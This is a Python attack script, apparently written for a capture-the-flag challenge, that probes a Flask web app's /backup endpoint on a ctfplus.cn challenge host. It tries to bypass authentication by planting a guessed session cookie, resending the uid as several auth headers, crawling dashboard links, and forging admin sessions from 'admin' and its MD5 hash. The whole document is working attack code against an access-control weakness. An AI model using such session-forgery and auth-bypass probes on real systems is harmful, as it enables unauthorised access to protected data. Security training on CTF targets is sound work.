import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 最后的尝试")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 直接设置 session cookie
print("[*] 测试1: 直接设置 session cookie")

# 获取当前 cookies
print(f"    [-] 当前 cookies: {dict(session.cookies)}")

# 手动设置 session cookie
session.cookies.set("session", "3553c1effa0b4698895a4874cfbd86d8", domain="")
print(f"    [-] 设置 session cookie")

# 访问备份
backup_resp = session.get(f"{BASE_URL}/backup")
print(f"    /backup: {backup_resp.status_code}")
if backup_resp.status_code != 404:
    print(f"    {backup_resp.text}")

print()

# 测试2: 尝试用其他认证头
print("[*] 测试2: 尝试认证头")

auth_headers = [
    {"Authorization": "Bearer 3553c1effa0b4698895a4874cfbd86d8"},
    {"X-Auth-Token": "3553c1effa0b4698895a4874cfbd86d8"},
    {"X-Session-Id": "3553c1effa0b4698895a4874cfbd86d8"},
    {"Cookie": f"session=3553c1effa0b4698895a4874cfbd86d8"},
]

for headers in auth_headers:
    resp = requests.get(f"{BASE_URL}/backup", headers=headers)
    if resp.status_code != 404:
        print(f"    [+] {headers}: {resp.status_code}")
        print(f"    {resp.text[:300]}")

print()

# 测试3: 尝试刷新 dashboard
print("[*] 测试3: 刷新 dashboard")

uid = "3553c1effa0b4698895a4874cfbd86d8"
session.post(f"{BASE_URL}/login", data={"uid": uid})

dashboard_resp = session.get(f"{BASE_URL}/dashboard")
print(f"    /dashboard: {dashboard_resp.status_code}")

# 检查是否有备份链接
links = re.findall(r'href=["\']([^"\']+)["\']', dashboard_resp.text)
if links:
    print(f"    [!] Links: {links}")
    for link in links:
        resp = session.get(f"{BASE_URL}{link}")
        if resp.status_code != 404:
            print(f"    [+] {link}: {resp.status_code}")
            print(f"    {resp.text[:300]}")

print()

# 测试4: 尝试直接构造管理员 session
print("[*] 测试4: 构造管理员 session")

# 猜测 session 格式
admin_sessions = [
    "admin",
    "21232f297a57a5a743894a0e4a801fc3",  # MD5('admin')
    "3553c1effa0b4698895a4874cfbd86d8",  # ADMiN
]

for admin_session in admin_sessions:
    session.cookies.clear()
    session.cookies.set("session", admin_session, domain="")
    
    backup_resp = session.get(f"{BASE_URL}/backup")
    if backup_resp.status_code != 404:
        print(f"    [!] Session {admin_session}: {backup_resp.status_code}")
        print(f"    {backup_resp.text}")

print()

# 测试5: 尝试触发备份
print("[*] 测试5: 触发备份")

session.post(f"{BASE_URL}/login", data={"uid": uid})

# 尝试刷新 session
refresh_resp = session.get(f"{BASE_URL}/")
print(f"    / (refresh): {refresh_resp.status_code}")

backup_resp = session.get(f"{BASE_URL}/backup")
print(f"    /backup: {backup_resp.status_code}")

print()

print("[*] 测试完成")
